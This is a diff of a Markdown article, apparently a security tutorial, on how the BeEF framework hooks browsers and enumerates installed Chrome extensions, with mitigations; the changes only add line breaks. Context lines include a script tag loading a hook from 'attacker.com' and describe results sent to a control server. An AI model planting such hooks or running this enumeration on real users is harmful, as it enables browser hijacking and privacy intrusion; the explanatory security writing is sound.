@@ -17,14 +17,15 @@ BeEF (Browser Exploitation Framework) is **a penetration testing tool that focus
 <script src="http://attacker.com/hook.js"></script>
 ```
 
-When the victim loads this script, the browser gets “hooked,” and the attacker gains control.
-
+When the victim loads this script, the browser gets “hooked,” and the attacker gains control.  
+<br>
 
 ## 2. Extracting Information About Chrome Extensions
-Once a browser is hooked using BeEF, the **attacker can gather various details, including Chrome extension information**. This is particularly concerning because browser extensions may contain sensitive data, such as:
+Once a browser is hooked using BeEF, the **attacker can gather various details, including Chrome extension information**. This is particularly concerning because browser extensions may contain sensitive data, such as:  
   - User data stored by the extensions.
   - Extension names and IDs.
-  - Behavioral insights (e.g., installed security tools).
+  - Behavioral insights (e.g., installed security tools).  
+<br>
 
 ## 3. Method of Getting Chrome Extension Information
   - BeEF uses JavaScript running in the context of the victim’s browser to enumerate the URLs and structure associated with Chrome extensions.
@@ -39,8 +40,8 @@ chrome-extension://<extension-id>/<file-path>
 
 ### Enumeration of Chrome Extensions
 1. The attacker uses the BeEF framework to inject code that attempts to load resources from common extension paths.
-2. By observing errors or successful loads, the attacker can infer which extensions are installed.
-
+2. By observing errors or successful loads, the attacker can infer which extensions are installed.  
+<br>
 
 ## 4. Example BeEF Module: Enumerating Extensions
 Using BeEF, an attacker can leverage the “Get Chrome Extensions” module, which attempts to detect popular Chrome extensions by loading known resource paths.
@@ -70,8 +71,8 @@ extensionIds.forEach(function(id) {
 ### How It Works
 1. The script checks known Chrome extension URLs (e.g., /manifest.json).
 2. If the request succeeds (200 OK), it confirms the extension is installed.
-3. The results are sent back to the BeEF control server.
-
+3. The results are sent back to the BeEF control server.  
+<br>
 
 ## 5. Practical Implications
   - **Privacy Concerns**
@@ -79,7 +80,8 @@ extensionIds.forEach(function(id) {
   - **Targeted Attacks**
     - Knowing which security extensions are installed allows attackers to craft targeted exploits.
   - **Security Bypasses**
-    - Attackers can identify and disable security-focused extensions using further social engineering or browser vulnerabilities.
+    - Attackers can identify and disable security-focused extensions using further social engineering or browser vulnerabilities.  
+<br>
 
 ## 6. Prevention and Mitigation
 1. **Avoid Untrusted Websites**
@@ -93,7 +95,8 @@ extensionIds.forEach(function(id) {
 5. **Browser Security Tools**
   - Use browser settings and extensions that restrict JavaScript execution on untrusted sites.
 6. **Monitor Browser Behavior**
-  - Regularly check for unusual network connections or JavaScript activity.
+  - Regularly check for unusual network connections or JavaScript activity.  
+<br>
 
 ## 7. Summary
 
